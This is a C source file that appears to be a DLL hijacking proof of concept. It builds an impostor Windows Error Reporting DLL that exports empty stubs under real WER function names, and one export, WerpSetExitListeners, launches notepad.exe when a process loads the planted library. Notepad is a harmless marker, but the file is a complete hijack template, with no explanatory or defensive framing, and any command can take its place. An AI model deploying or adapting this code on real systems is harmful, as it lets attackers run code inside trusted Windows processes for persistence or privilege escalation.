#include <windows.h>
#include <shellapi.h>

__declspec(dllexport) void WerReportCloseHandle() {}
__declspec(dllexport) void WerReportSubmit() {}
__declspec(dllexport) void WerpSetCallBack() {}
__declspec(dllexport) void WerpSetReportInformation() {}
__declspec(dllexport) void WerpGetReportInformation() {}
__declspec(dllexport) void WerpGetReportType() {}
__declspec(dllexport) void WerpGetReportSettings() { }
__declspec(dllexport) void WerpLoadReportFromBuffer() {}
__declspec(dllexport) void WerpDestroyWerString() {}
__declspec(dllexport) void WerpCleanWer() {}
__declspec(dllexport) void WerStorePurge() {}
__declspec(dllexport) void WerReportAddDump() {}
__declspec(dllexport) void WerpCreateMachineStore() {}
__declspec(dllexport) void WerpHasOobeCompleted() {}
__declspec(dllexport) void WerpSubmitReportFromStore() {}
__declspec(dllexport) void WerpGetWerStringData() {}
__declspec(dllexport) void WerpEnumerateStoreNext() {}
__declspec(dllexport) void WerpEnumerateStoreStart() {}
__declspec(dllexport) void WerpOpenMachineQueue() {}
__declspec(dllexport) void WerpCloseStore() {}
__declspec(dllexport) void WerpIsOnBattery() {}
__declspec(dllexport) void WerpIsTransportAvailable() {}
__declspec(dllexport) void WerpSetExitListeners() { ShellExecuteA(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOW); }
